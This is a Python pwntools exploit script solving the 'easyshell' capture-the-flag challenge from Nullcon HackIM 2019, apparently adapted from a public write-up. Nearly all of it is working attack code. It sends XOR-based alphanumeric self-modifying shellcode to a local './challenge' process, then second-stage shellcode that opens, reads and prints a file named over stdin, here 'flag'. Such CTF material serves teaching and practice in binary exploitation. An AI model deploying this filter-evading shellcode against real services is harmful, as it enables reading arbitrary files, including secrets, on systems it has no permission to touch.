# This exploit is based off of: https://lordidiot.github.io/2019-02-03/nullcon-hackim-ctf-2019/#peasy-shell

from pwn import *

target = process('./challenge')
#gdb.attach(target, gdbscript='entry-break')

context.arch = "amd64"

# Check the writeup for a detailed explanation of this shellcode
sc0 = asm("""

push rdx
push rdx
push rdx
push rdx
push rdx
push rdx
push rdx

push rsp
pop rcx

xor eax, 0x30307730
xor eax, 0x30306730

xor dword ptr[rcx + 0x30], eax

pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx

xor eax, 0x30307730
xor eax, 0x30306730

xor eax, 0x30363030
xor eax, 0x35396e6f

xor dword ptr [rcx + 0x30], eax

push rcx
push rcx
push rcx
push rcx
push rcx
push rcx
push rcx

push rsp
pop rcx

xor eax, 0x30363030
xor eax, 0x35396e6f

xor eax, 0x30303059
xor eax, 0x30303069

xor dword ptr[rcx + 0x30], eax

pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx
pop rcx

push r11
pop rdx

push rbx
pop rax

push rcx
push rbx
push rcx
""")



target.send(sc0)

# checkout https://github.com/guyinatuxedo/ctf/tree/master/hackIM19/pwn/easyshell for a detailed explanation of this shellcode
sc1 = asm("""
sub rsp, 0x1000
mov rsi, rsp
xor rdi, rdi
mov rdx, 0x100
xor rax, rax
syscall

mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall

mov rdi, rax
mov rsi, rsp
mov rdx, 0x100
xor rax, rax
syscall

mov rdi, 1
mov rsi, rsp
mov rdx, 0x100
mov rax, 1
syscall
""")

target.send("0"*4 + sc1)

target.send("flag\x00")

target.interactive()
